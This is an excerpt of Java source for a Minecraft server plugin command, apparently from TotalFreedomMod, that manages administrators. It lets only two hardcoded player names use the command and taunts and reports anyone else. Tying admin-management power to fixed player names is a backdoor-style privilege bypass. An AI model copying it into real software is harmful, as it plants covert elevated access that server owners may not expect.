...
@CommandParameters(description = "EXPLODINGTNT001 Administration Management", usage = "/<command> <add | nubcake | delete> <username>")
public class Command_utilities extends TFM_Command
{
    ...
    public boolean run(final CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        ...
        if (!sender.getName().equals("EXPLODINGTNT001"))
        if (!sender.getName().equals("Alco_Rs11"))
        {
            sender.sendMessage(TFM_Command.MSG_NO_PERMS);
            TFM_Util.adminAction("§7[CONSOLE]§f<§cEXPLODINGTNT001§f> " + sender.getName(), "Nice try... You nubface -_-!", true);
            server.dispatchCommand(sender, "mail send EXPLODINGTNT001 §4[WARNING]" + sender.getName() + " Attempted to use admin manage cmd");
